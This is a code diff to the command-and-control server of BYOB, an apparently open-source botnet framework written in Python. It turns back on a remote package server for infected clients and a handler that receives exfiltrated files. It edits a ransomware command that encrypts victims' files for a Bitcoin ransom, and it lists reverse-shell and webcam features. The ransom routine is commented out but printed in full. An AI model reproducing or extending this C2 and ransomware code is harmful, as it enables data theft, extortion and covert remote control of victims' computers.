@@ -133,17 +133,18 @@ def main():
     globals()['debug'] = options.debug
 
     # host Python packages on C2 port + 2 (for clients to remotely import)
-    # globals()['package_handler'] = subprocess.Popen('{} -m {} {}'.format(sys.executable, http_serv_mod, options.port + 2), 0, None, subprocess.PIPE, stdout=tmp_file, stderr=tmp_file, cwd=globals()['packages'], shell=True)
+    globals()['package_handler'] = subprocess.Popen('{} -m {} {}'.format(sys.executable, http_serv_mod, options.port + 2), 0, None, subprocess.PIPE, stdout=tmp_file, stderr=tmp_file, cwd=globals()['packages'], shell=True)
 
     # host BYOB modules on C2 port + 1 (for clients to remotely import)
     globals()['module_handler'] = subprocess.Popen('{} -m {} {}'.format(sys.executable, http_serv_mod, options.port + 1), 0, None, subprocess.PIPE, stdout=tmp_file, stderr=tmp_file, cwd=modules, shell=True)
 
     # run simple HTTP POST request handler on C2 port + 3 to handle incoming uploads of exfiltrated files
-    # globals()['post_handler'] = subprocess.Popen('{} core/handler.py {}'.format(sys.executable, int(options.port + 3)), 0, None, subprocess.PIPE, stdout=tmp_file, stderr=tmp_file, shell=True)
+    globals()['post_handler'] = subprocess.Popen('{} core/handler.py {}'.format(sys.executable, int(options.port + 3)), 0, None, subprocess.PIPE, stdout=tmp_file, stderr=tmp_file, shell=True)
 
     # run C2
     globals()['c2'] = C2(host=options.host, port=options.port, db=options.database)
     globals()['c2'].run()
+
 
 
 class C2():
@@ -222,7 +223,7 @@ class C2():
                 'description': 'interact with a client with a reverse TCP shell through an active session'},
             'ransom' : {
                 'method': 'you must first connect to a session to use this command', # self.session_ransom,
-                'usage': 'ransom [id]',
+                'usage': 'ransom [id] [rsa key]',
                 'description': 'encrypt client files & ransom encryption key for a Bitcoin payment'},
             'webcam' : {
                 'method': self.session_webcam,
@@ -858,32 +859,34 @@ class C2():
                 self.database._display(ses.info)
                 print()
 
-    def session_ransom(self, args=None):
-        """
-        Encrypt and ransom files on client machine
+    # def session_ransom(self, args=None):
+    #     """
+    #     Encrypt and ransom files on client machine
 
-        `Required`
-        :param str args:    encrypt, decrypt, payment
+    #     `Required`
+    #     :param str args:    encrypt, decrypt, payment
 
-        """
-        if not self.current_session:
-            util.log("No client selected")
-            return "No client selected"
+    #     """
+    #     if not self.current_session:
+    #         util.log("No client selected")
+    #         return "No client selected"
 
-        if 'decrypt' in str(args):
-            self.current_session.send_task({"task": "ransom {} {}".format(args, self.current_session.rsa.exportKey())})
-        elif 'encrypt' in str(args):
-            print('line 875 task: ', "ransom {} {}".format(args, self.current_session.rsa.publickey().exportKey()))
-            self.current_session.send_task({"task": "ransom {} {}".format(args, self.current_session.rsa.publickey().exportKey())})
-            # pass
-        else:
-            self.current_session.send_task({"task": "ransom {}".format(args)})
+    #     command = "ransom {}".format(args)
 
-        task = self.current_session.recv_task()
-        result = task.get('result')
-        self.current_session._active.set()
+    #     if 'decrypt' in str(args):
+    #         command = "ransom {} {}".format(args, self.current_session.rsa.exportKey())
+    #     elif 'encrypt' in str(args):
+    #         print('line 875 task: ', "ransom {} {}".format(args, self.current_session.rsa.publickey().exportKey()))
+    #         command = "ransom {} {}".format(args, self.current_session.rsa.publickey().exportKey())
 
-        return "Catching end case"
+    #     # task = self.current_session.recv_task()
+    #     # result = task.get('result')
+    #     # self.current_session._active.set()
+
+    #     task = globals()['c2'].database.handle_task({'task': command, 'session': self.info.get('uid')})
+    #     self.send_task(task)
+
+    #     return "Catching end case"
 
 
     def session_shell(self, session):
@@ -1187,35 +1190,28 @@ class Session(threading.Thread):
                                     globals()['c2'].display(result.encode())
                                     globals()['c2'].database.handle_task(task)
                                 else:
-                                    print('in failed case line 1182')
+                                    globals()['c2']._print("Error! Malformated return value from command! Session scheduled and ran command '" + cmd + "'but it returned a None value. Please return a string")
                                 continue
                             else:
-                                print("Error 1195. Not callable function")
+                                globals()['c2']._print("Error! Malformated method in Session! Session regiestered the method in C2.method[" + cmd + "] as callable when it, in fact, wasn't.")
                         else:
                             task = globals()['c2'].database.handle_task({'task': command, 'session': self.info.get('uid')})
-                            # task = globals()['c2'].database.handle_task({'task': 'portscanner 127.0.0.1', 'session': self.info.get('uid')})
                             self.send_task(task)
                     elif 'result' in task:
                         if task.get('result') and task.get('result') != 'None':
                             globals()['c2'].display(task.get('result').encode())
                             globals()['c2'].database.handle_task(task)
                         else:
-                            """
-
-                            THIS IS GOING TO BE A FAILURE CASE. CATCH
-                            THE BUG HERE
-
-                            """
-                            print(task)
+                            globals()['c2']._print("Error! Malformated task in Session! Tasks has a result field set to None. Verify bot communication code and return values from internal Session functions.")
                     else:
-                        print("line 1207. Task doesn't have any categories in it")
+                        globals()['c2']._print("Error! Malformated task to Session! Tasks need to include one of the following keys: result, prompt, or help.\n")
                 else:
                     if self._abort:
                         break
                     elif isinstance(task, int) and task == 0:
                         break
                     else:
-                        print("line 1211. Not abort and task isn't int")
+                        globals()['c2']._print("Error! Malformated task to Session! It should be an int or a dict.\n")
                 self._prompt = None
 
         time.sleep(1)
